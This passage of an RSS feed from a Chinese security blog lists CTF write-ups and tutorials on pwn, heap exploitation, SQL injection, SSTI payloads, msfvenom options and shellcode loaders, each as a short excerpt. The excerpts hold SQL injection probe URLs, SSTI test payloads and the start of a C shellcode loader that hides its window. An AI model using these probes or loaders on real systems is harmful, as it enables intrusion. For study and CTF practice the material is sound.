      <description>0x10.[ACTF2020 新生赛]Upload 和之前的一个一样，改个后缀名就OK。 0x11.[ACTF2020 新生赛]BackupFile 可以简单扫下，发现index.php.bak &amp;lt;?php include_once &amp;#34;flag.php&amp;#34;; if(isset($_GET[&amp;#39;key&amp;#39;])) { $key = $_GET[&amp;#39;key&amp;#39;]; if(!is_numeric($key)) { exit(&amp;#34;Just num!&amp;#34;); } $key = intval($key); $str = &amp;#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;#34;; if($key == $str) { echo $flag; } } else { echo &amp;#34;Try to find out source file!&amp;#34;; } str弱相等，被转化为整形 传参ke</description>
    </item>
    <item>
      <title>BUU_WEB刷题_0x01-0x0F</title>
      <link>http://ghostasky.github.io/posts/buu-web-0x1-0xf/</link>
      <pubDate>Sat, 17 Apr 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-web-0x1-0xf/</guid>
      <description>[TOC] 0x1.[HCTF 2018]WarmUp 代码审计+文件包含 &amp;lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;amp;$page) { $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;]; if (! isset($page) || !is_string($page)) { echo &amp;#34;you can&amp;#39;t see it&amp;#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;) ); /*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置， 所以基本可以</description>
    </item>
    <item>
      <title>CISCN_PWN</title>
      <link>http://ghostasky.github.io/posts/ciscn-pwn/</link>
      <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/ciscn-pwn/</guid>
      <description>[TOC] ciscn_2019_s_3 32位与64位 系统调用的区别： 1. 传参方式不同 2. 系统调用号 不同 3. 调用方式 不同 32位： 传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器 调用号：sys_read 的调用号 为 3</description>
    </item>
    <item>
      <title>在64位的glibc上payload调用system导致crash的问题</title>
      <link>http://ghostasky.github.io/posts/64%E4%BD%8Dpayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</link>
      <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/64%E4%BD%8Dpayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</guid>
      <description>[TOC] 在64位的glibc上payload调用system导致crash的问题 在一些64位的pwn题中，调用system后会导致程序crash掉 首先小讲下原因： .text:000000000040F93C mov [rsp+198h+var_190], rax .text:000000000040F941 movhps xmm0, [rsp+198h+var_190] .text:000000000040F946 movaps [rsp+198h+var_158], xmm0 .text:000000000040F94B call sigaction 是movaps [rsp+198h+var_158], xmm0指令要求rsp+198h+va</description>
    </item>
    <item>
      <title>pwndbg和Linux改用户名及密码踩坑</title>
      <link>http://ghostasky.github.io/posts/pwndbg%E5%92%8Clinux%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E8%B8%A9%E5%9D%91/</link>
      <pubDate>Tue, 23 Mar 2021 00:10:56 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/pwndbg%E5%92%8Clinux%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E8%B8%A9%E5%9D%91/</guid>
      <description>[TOC] 关于pwndbg 安装： git clone https://github.com/pwndbg/pwndbg cd pwndbg sudo ./setup.sh gdb后如果是peda或者其他的插件，可以改下配置文件.gdbinit，在home中，或者root目录下，加上这么一句，其他注释掉。 source /home/yourname/pwndbg/gdbinit.py 关于Ubuntu修改用户名和密码 修改root密码 sudo passwd root 修改用户名密</description>
    </item>
    <item>
      <title>Chunk Extend and Overlapping</title>
      <link>http://ghostasky.github.io/posts/chunk-extend-and-overlapping/</link>
      <pubDate>Mon, 22 Mar 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/chunk-extend-and-overlapping/</guid>
      <description>[TOC] Chunk Extend and Overlapping 介绍 chunk extend 是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用的方法需要以下的条件： 程序中存在堆的漏洞 漏洞可以控制chunk header中的数据 原理 这种利用的技术能够产生在于</description>
    </item>
    <item>
      <title>堆中的off-by-one</title>
      <link>http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</link>
      <pubDate>Sun, 21 Mar 2021 02:29:42 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</guid>
      <description>[TOC] 介绍 off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。 漏洞原理 这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常</description>
    </item>
    <item>
      <title>简单堆溢出介绍</title>
      <link>http://ghostasky.github.io/posts/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/</link>
      <pubDate>Sun, 14 Mar 2021 00:58:32 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/</guid>
      <description>[TOC] 介绍 ​ 堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可用的字节数，因而导致了数据的溢出，并覆盖到了物理相邻的高地址的下一个堆块。 ​ so，堆溢出漏洞发生的前提： 写入的数据写到了堆上 写入数据的大小没有被控制 堆溢出是一种特定的缓冲区溢出（</description>
    </item>
    <item>
      <title>堆概述及其相关数据结构</title>
      <link>http://ghostasky.github.io/posts/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</link>
      <pubDate>Wed, 03 Mar 2021 22:18:17 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</guid>
      <description>[TOC] 堆利用 目前堆的实现有很多种，具体如下： dlmalloc – General purpose allocator ptmalloc2 – glibc jemalloc – FreeBSD and Firefox tcmalloc – Google libumem – Solaris 接下来主要以glibc中堆的实现为主进行介绍。 堆概述 内存分配后的系统调用 在我们动态申请和释放内存时，无论是malloc还是free函数，都不是真正与系统交互的函数</description>
    </item>
    <item>
      <title>整数溢出</title>
      <link>http://ghostasky.github.io/posts/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</link>
      <pubDate>Wed, 03 Mar 2021 11:17:41 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</guid>
      <description>[TOC] 整数溢出介绍 C语言中整数的分类及各自的大小范围： 类型 字节 范围 short int 2byte(word) 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) unsigned short int 2byte(word) 0~65535(0~0xffff) int 4byte(word) 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) unsigned int 4byte(word) 0~4294967295(0~0xffffffff) long 8byte(word) 正: 0~0x7fffffffffffffff 负: 0x8000000000000000~0xffffffffffffffff unsigned long 8byte(word) 0~0xffffffffffffffff 正是因为这些类型的大小范围的限制导致整数溢出。 整数溢出原理 整数溢出的异常有3种： 溢出 只有有符号数才会发生溢出。 溢出标志</description>
    </item>
    <item>
      <title>JSON相关</title>
      <link>http://ghostasky.github.io/posts/json%E7%9B%B8%E5%85%B3/</link>
      <pubDate>Sat, 27 Feb 2021 17:57:36 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/json%E7%9B%B8%E5%85%B3/</guid>
      <description>1. JSON的两种结构 两种结构分别为：对象，数组。 对象结构 这种结构以大括号开始和结束，中间有多个以逗号分隔的键值对构成，键值对由冒号分隔。 { key:value, key2:value2, key3:value3, ... } 其中的键为字符串，而值可以是字符串，数值，true，false，null，对象或数组。 数组结</description>
    </item>
    <item>
      <title>2020年终总结</title>
      <link>http://ghostasky.github.io/posts/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Fri, 12 Feb 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ret2csu</title>
      <link>http://ghostasky.github.io/posts/ret2csu/</link>
      <pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/ret2csu/</guid>
      <description>ret2csu 原理 x64中，函数的前6个参数是通过寄存器传参的（ 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9），但是大多数情况下，我们很难找到每个寄存器对应的gadgets。这时，我们可以利用x64下的_libc_csu_init中的gadgets。这个函数</description>
    </item>
    <item>
      <title>格式化字符串漏洞举例</title>
      <link>http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/</link>
      <pubDate>Sat, 06 Feb 2021 18:50:57 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/</guid>
      <description>[TOC] 格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。 例子 这里用的是2017年的UIUCTF中的pwn200GoodLu</description>
    </item>
    <item>
      <title>Linux保护技术</title>
      <link>http://ghostasky.github.io/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</link>
      <pubDate>Tue, 02 Feb 2021 23:09:51 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</guid>
      <description>[TOC] linux保护技术 NX保护 作用： ​ 将数据（栈，堆）所在内存页标识为不可执行，当程序成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令 编译选项： 关闭： -z execstack 开启： -z noexecstack PIE保护 作用： ​ 使</description>
    </item>
    <item>
      <title>格式化字符串原理介绍及利用</title>
      <link>http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/</link>
      <pubDate>Mon, 01 Feb 2021 18:31:36 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/</guid>
      <description>[TOC] 原理介绍 [INPUT]: printf(&amp;ldquo;Color %s,number %d,fload %4.2f&amp;rdquo;,&amp;ldquo;red&amp;rdquo;, 123456,3.14); [OUTPUT]:Color red,number 123456,float 3.14 格式化字符串函数 常见的有： 输入 scanf 输出 函数 基本介绍 printf 输出到stdout fprintf 输出到指定FILE流 vprintf 根据参数列表格式化输出到stdout vfprintf 根据参数列表格式化输出到指定 FILE 流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数</description>
    </item>
    <item>
      <title>PWN_Ret2libc</title>
      <link>http://ghostasky.github.io/posts/pwn-ret2libc/</link>
      <pubDate>Thu, 28 Jan 2021 00:58:55 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/pwn-ret2libc/</guid>
      <description>1.ret2libc1 先讲几个知识点： system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。 PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。 GOT(Global Offset Table)表中的数据才是</description>
    </item>
    <item>
      <title>PWN_ret2text,ret2syscall,ret2shellcode</title>
      <link>http://ghostasky.github.io/posts/pwn-ret2textret2syscallret2shellcode/</link>
      <pubDate>Wed, 27 Jan 2021 11:32:16 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/pwn-ret2textret2syscallret2shellcode/</guid>
      <description>1.Ret2text 首先file和checksec一下： ida打开： 观察到有个vulnerable()函数： 还有个后门函数：get_shell() gdb打开，main处下断点后跟进，输入12345678后查看stack： 此时ebp= 0xffffd108, 将黄色与红色全部覆盖后填</description>
    </item>
    <item>
      <title>pip下载过慢解决办法</title>
      <link>http://ghostasky.github.io/posts/pip%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</link>
      <pubDate>Sat, 23 Jan 2021 21:31:55 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/pip%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</guid>
      <description>pip install packet 以上命令安装时过慢，可以加入： -i https://pypi.tuna.tsinghua.edu.cn/simple 设置国内源为默认源： 首先看pip版本 pip -V 如果版本在10.0.0以上需要如下： python -m pip install --upgrade pip pip install pip -U pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 搞定。</description>
    </item>
    <item>
      <title>文件包含漏洞</title>
      <link>http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Wed, 25 Nov 2020 14:58:30 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</guid>
      <description>[TOC] 1.文件包含相关函数 ​ include()，include_once()，require()，require_once() require()函数如果在包含的时候有错，如文件不存在，会直接退出，不执行后面的语句 include()函数如果在包含</description>
    </item>
    <item>
      <title>Python__request，socket模块</title>
      <link>http://ghostasky.github.io/posts/python__requestsocket%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Mon, 23 Nov 2020 20:18:54 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/python__requestsocket%E6%A8%A1%E5%9D%97/</guid>
      <description>[TOC] 一、requests库基本使用 请求方式： ​ get，post，head，put，delete，options。 **kwargs访问控制参数： params：字典或字节序列，作为参数加到URL中 data：字典、字节序列或文件对象，作为reque</description>
    </item>
    <item>
      <title>BUU_RE_1</title>
      <link>http://ghostasky.github.io/posts/buu-re-1/</link>
      <pubDate>Sun, 22 Nov 2020 01:49:47 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-re-1/</guid>
      <description>刚入RE，话不多说，BUU简单RE题目WP如下： [toc] 1.easyre cmd打开，输入，发现输出错误，拖入IDA查看 其实直接看到flag，但还是具体来分析一下 首先输入两个输入两个int类型的数，然后比较，如果不相等，则跳转到loc_40152F，并输出sor</description>
    </item>
    <item>
      <title>Python__RE模块与正则表达式</title>
      <link>http://ghostasky.github.io/posts/python__re%E6%A8%A1%E5%9D%97%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Sat, 21 Nov 2020 00:24:49 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/python__re%E6%A8%A1%E5%9D%97%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>[TOC] 一Python模块之RE模块 一些可选值： re.I（全拼：ignorecase）：忽略大小写 re.M（全拼：multiline）：多行模式，改变^和$的行为 re.S（全拼：datall）：点任意匹配模式，改变.的行为 re.L（全拼local</description>
    </item>
    <item>
      <title>SQL注入小结</title>
      <link>http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/</link>
      <pubDate>Thu, 19 Nov 2020 09:11:07 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/</guid>
      <description>[TOC] 1.联合查询注入： http://xxxx.xx/?id=1&amp;#39; http://xxxx.xx/?id=1&amp;#39; order by 4# union前后的字段数要一致，所以要order by http://xxxx.xx/?id=1&amp;#39; union 1,2,3,database()# ​ 假设当前数据库:bugku ​ user(): ​ database(): ​ table_schema:库名 ​ table_name:表名 ​ column_name:列名 先介绍几个函数： 一 concat</description>
    </item>
    <item>
      <title>2024年终总结</title>
      <link>http://ghostasky.github.io/posts/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Wed, 01 Nov 1111 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>http://ghostasky.github.io/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/about/</guid>
      <description>怕什么真理无穷，进一寸有进一寸的欢喜 关于我 垃圾pwn手，不搞pwn了，开始学一些渗透，红队，免杀&amp;hellip; 本科在校生/CTFer，信息安全爱好者 啥都想学：数学，物理，信安，开发，机器学习，图像处理&amp;hellip; 一个无趣的人，一个无趣</description>
    </item>
    <item>
      <title>BUU_PWN刷题_0x50-0x5F</title>
      <link>http://ghostasky.github.io/posts/buu-pwn-0x50-0x5f/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-pwn-0x50-0x5f/</guid>
      <description>[TOC] 0x50.mrctf2020_shellcode_revenge（可见字符shellcode） 因为call的缘故，没办法f5. gwt@ubuntu:~/Desktop$ checksec mrctf2020_shellcode_revenge [*] &amp;#39;/home/gwt/Desktop/mrctf2020_shellcode_revenge&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 大致流程: print(&amp;#34;Show me your magic!\n&amp;#34;); buf = read(0x400) if(!(0x60&amp;lt;input[i]&amp;lt;0x7A || 0x2F&amp;lt;input[i]&amp;lt;ox5A) print(&amp;#34;I Can&amp;#39;t Read This!&amp;#34;) buf() 于是： git clone https://github.com/TaQini/alpha3.git cd alpha3 //需要</description>
    </item>
    <item>
      <title>HTTP头各字段详解</title>
      <link>http://ghostasky.github.io/posts/2023-2-http%E5%A4%B4/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2023-2-http%E5%A4%B4/</guid>
      <description>[toc] 记录下http头各个字段的含义。 Accept 浏览器（或者其他基于HTTP的客户端程序）可以接收的内容类型（或者说通知服务器可以发回的数据类型）,例如 Accept: text/plain 示例： Accept: text/html Accept: image/* Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8 Accept-Charset 浏览器能识别的字符集 示例： Accept-Charset: iso-8859-1 Accept-Charset: utf-8, iso-8859-1;q=0.5 Accept-Charset: utf-8, iso-8859-1;q=0.5, *;q=0.1 Accept-Encoding 浏览器可以处理的编码方式</description>
    </item>
    <item>
      <title>Java-类加载器</title>
      <link>http://ghostasky.github.io/posts/java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</guid>
      <description>[toc] 前言+流程 java语言依赖JVM，运行的时候，需要先编译成class文件，之后java类初始化的时候会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法来定义一个java.la</description>
    </item>
    <item>
      <title>kerberos认证&amp;PAC</title>
      <link>http://ghostasky.github.io/posts/%E5%9F%9F%E5%A7%94%E6%B4%BE/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E5%9F%9F%E5%A7%94%E6%B4%BE/</guid>
      <description>[toc] 这个是鸽了好久好久的，一直没写，今天补一下。还有域委派的想写一直没写&amp;hellip;&amp;hellip; 关于详细的可以RFC文档：https://datatracker.ietf.org/doc/html/rfc4120.html kerver</description>
    </item>
    <item>
      <title>msfvenom参数详解</title>
      <link>http://ghostasky.github.io/posts/msfvenom%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/msfvenom%E8%AF%A6%E8%A7%A3/</guid>
      <description>[toc] 常规参数 所有参数 -p, –payload &amp;lt; payload&amp;gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的 -l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, platforms, archs, encrypt, formats, all -n, –nopsled &amp;lt; length&amp;gt; 为payloa</description>
    </item>
    <item>
      <title>NTLM认证</title>
      <link>http://ghostasky.github.io/posts/ntml/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/ntml/</guid>
      <description>[toc] NTLM的东西在github之前写过，但是不够详细，这里重新再过一遍。 NTLM使用在Windows的工作组环境中，而kerberos则使用在域的情况下。 LM hash &amp;amp; NTLM hash 在写NTLM认证之前先写下LM和NTLM。 hash密码格式： Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0::: 用户名:SID</description>
    </item>
    <item>
      <title>Powershell</title>
      <link>http://ghostasky.github.io/posts/powershell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/powershell/</guid>
      <description>[toc] 基础 变量 以$开头，大小写不敏感。 数组 $array = 1,2,3,4 $array = 1..4 $array=1,&amp;#34;2017&amp;#34;,([System.Guid]::NewGuid()),(get-date) $a=@() # 空数组 $a=,&amp;#34;1&amp;#34; # 一个元素的数组 ##访问 $ip = ipconfig $ip[1] # 获取ipconfig第二行的数据 ##判断 $test -is [array] ##追加 $books += &amp;#34;元素4&amp;#34; 哈希表 ##创建 $stu=@{ Name = &amp;#34;test&amp;#34;;Age=&amp;#34;12&amp;#34;;sex=&amp;#34;man&amp;#34; } $stu=@{ Name = &amp;#34;hei&amp;#34;;Age=&amp;#34;12&amp;#34;;sex=&amp;#34;man&amp;#34;;Books=&amp;#34;kali&amp;#34;,&amp;#34;sqlmap&amp;#34;,&amp;#34;powershell&amp;#34; } ##插入删除 $Student=@{} $Student.Name=&amp;#34;hahaha&amp;#34; $stu.Remove(&amp;#34;Name&amp;#34;) 对象 查</description>
    </item>
    <item>
      <title>ShellCode Loader(持续更新)</title>
      <link>http://ghostasky.github.io/posts/shellcodeloader/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/shellcodeloader/</guid>
      <description>记录一些语言的shellcode 加载方式，持续更新&amp;hellip; [toc] C/C++ 首先是c的loader，分两种，指针直接执行和动态分配。 指针执行 ##include &amp;lt;stdio.h&amp;gt; ##include &amp;lt;windows.h&amp;gt; //设置入口地址，不弹出黑窗口 ## pragma comment(linker,&amp;#34;/subsystem:\&amp;#34;Windows\&amp;#34; /entry:\&amp;#34;mainCRTStartup\&amp;#34;&amp;#34;) unsigned char shellcode[] = &amp;#34;shellcode&amp;#34;; void main() { //都可 //((void(*)()) &amp;amp;shellcode)(); //(*(void(*)()) &amp;amp;shellcode)(); //也可以这样 //void (*func)(); //func = (void (*)())(void *)shellcode;</description>
    </item>
    <item>
      <title>SSTI payload记录</title>
      <link>http://ghostasky.github.io/posts/ssti/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/ssti/</guid>
      <description>[toc] 1.PHP中的ssti Twig框架 {{}}:输出 {# 注释 #}:注释 {% %}：逻辑运算 循环： {% for word in words %} {{ word }} {% endfor %} 测试用payload: {{2*2**3}} = 16 {# 这里要注意的是，#要写成%23，不然会被浏览器当成锚点 #} {{2*2**3}}{%23%20注释不会</description>
    </item>
    <item>
      <title>WinDbg使用及双机调试</title>
      <link>http://ghostasky.github.io/posts/windbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/windbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</guid>
      <description>[toc] 双机调试 虚拟机添加串行端口：（如果发现建立的串行端口一直是串行端口2，则把虚拟机硬件中的打印机删除即可创建串行端口1） 虚拟机中管理员打开powershell，bcdedit /enum查看启动的配置： 执行以下命令： bcdedit /set “{current}”</description>
    </item>
    <item>
      <title>编译原理Note</title>
      <link>http://ghostasky.github.io/posts/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/</guid>
      <description>[toc] 英语太差，斯坦福cs143的课看着难受，拿哈工大的编译原理来看，顺序就按照P的顺序 P2编译系统结构 具体举个例子： P3词法分析概述 编译器的第一个步骤称为词法分析( lexicalanalysis)。 词法分析器读人组成源程序的字符流，并且将它们</description>
    </item>
    <item>
      <title>回调函数加载shellcode</title>
      <link>http://ghostasky.github.io/posts/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BDshellcode/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BDshellcode/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
